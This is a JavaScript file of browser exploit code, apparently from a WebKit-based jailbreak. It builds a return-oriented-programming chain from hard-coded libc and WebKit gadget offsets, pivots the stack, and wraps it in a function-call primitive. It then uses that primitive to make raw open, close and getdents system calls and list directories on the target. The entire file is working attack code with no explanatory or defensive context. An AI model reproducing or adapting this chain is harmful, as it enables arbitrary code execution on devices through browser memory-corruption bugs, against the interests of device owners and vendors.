var ropchain_array = new Uint32Array(114);
var ropchain = read_ptr_at(addrof(ropchain_array) + 0x10);
var ropchain_offset = 2;
function set_gadget(val) {
  ropchain_array[ropchain_offset++] = val | 0;
  ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l) {
  for (var i = 0; i < l.length; i++) set_gadget(l[i]);
}
function db(data) {
  for (var i = 0; i < data.length; i++)
    ropchain_array[ropchain_offset++] = data[i];
}
var retbuf = malloc(8);
ropchain_offset = 2;
set_gadgets([
  libc_base + 811575, //pop rsp
  ropchain + 280 //start
]);
ropchain_offset += 64;
//start:
set_gadgets([
  libc_base + 792472, //pop rcx
  ropchain + 416, //rdi_bak
  libc_base + 577546, //mov [rcx], rdi
  libc_base + 206806 //pop rdi
]);
var arg1_offset = 312;
ropchain_offset = 78;
db([0, 0]); // 0x0
set_gadget(libc_base + 793877); //pop rsi
var arg2_offset = 328;
ropchain_offset = 82;
db([0, 0]); // 0x0
set_gadget(webkit_base + 105267); //pop rdx
var arg3_offset = 344;
ropchain_offset = 86;
db([0, 0]); // 0x0
set_gadget(libc_base + 792472); //pop rcx
var arg4_offset = 360;
ropchain_offset = 90;
db([0, 0]); // 0x0
set_gadget(webkit_base + 432898); //pop r8
var arg5_offset = 376;
ropchain_offset = 94;
db([0, 0]); // 0x0
set_gadget(webkit_base + 10235455); //pop r9
var arg6_offset = 392;
ropchain_offset = 98;
db([0, 0]); // 0x0
var faddr_offset = 400;
ropchain_offset = 100;
db([0, 0]); // 0x0
set_gadget(libc_base + 206806); //pop rdi
//rdi_bak:
db([0, 0]); // 0x0
set_gadgets([
  libc_base + 793877, //pop rsi
  retbuf,
  webkit_base + 7438103, //mov [rsi], rax
  pivot_addr
]);
function fcall(faddr, arg1, arg2, arg3, arg4, arg5, arg6) {
  write_ptr_at(ropchain + faddr_offset, faddr);
  write_ptr_at(ropchain + arg1_offset, arg1);
  write_ptr_at(ropchain + arg2_offset, arg2);
  write_ptr_at(ropchain + arg3_offset, arg3);
  write_ptr_at(ropchain + arg4_offset, arg4);
  write_ptr_at(ropchain + arg5_offset, arg5);
  write_ptr_at(ropchain + arg6_offset, arg6);
  pivot(ropchain);
  return read_mem(retbuf, 8);
}
var path_buf     = malloc(0x1000);
var getdents_buf = malloc(0x1000);

function sys_open(path) {
  var q = [];
  for (var i = 0; i < path.length; i++) q.push(path.charCodeAt(i));
  q.push(0);
  write_mem(path_buf, q);
  var q = fcall(sys_5_addr, path_buf, 0);
  if ("" + q == "255,255,255,255,255,255,255,255") return -1;
  var ans = 0;
  for (var i = 7; i >= 0; i--) ans = ans * 256 + q[i];
  return ans;
}

function sys_close(fd) {
  fcall(sys_6_addr, fd);
}

function sys_getdents(fd) {
  var q = fcall(sys_272_addr, fd, getdents_buf, 0x1000);
  if ("" + q == "255,255,255,255,255,255,255,255") return null;
  var l = 0;
  for (var i = 7; i >= 0; i--) l = l * 256 + q[i];
  var ans = [];
  var offset = 0;
  while (offset < l) {
    var ll = read_mem(getdents_buf + offset + 4, 2);
    var next = offset + ll[0] + 256 * ll[1];
    var ll = read_mem(getdents_buf + offset + 7, 1)[0];
    var name = read_mem(getdents_buf + offset + 8, ll);
    offset = next;
    var s = "";
    for (var i = 0; i < ll; i++) s += String.fromCharCode(name[i]);
    ans.push(s);
  }
  return ans;
}

function listdir(path) {
  var fd = sys_open(path);
  if (fd < 0) throw "open failed";
  var ans = [];
  while (true) {
    var q = sys_getdents(fd);
    if (!q) {
      sys_close(fd);
      throw "getdents failed";
    }
    if (!q.length) break;
    for (var i = 0; i < q.length; i++) ans.push(q[i]);
  }
  sys_close(fd);
  return ans;
}
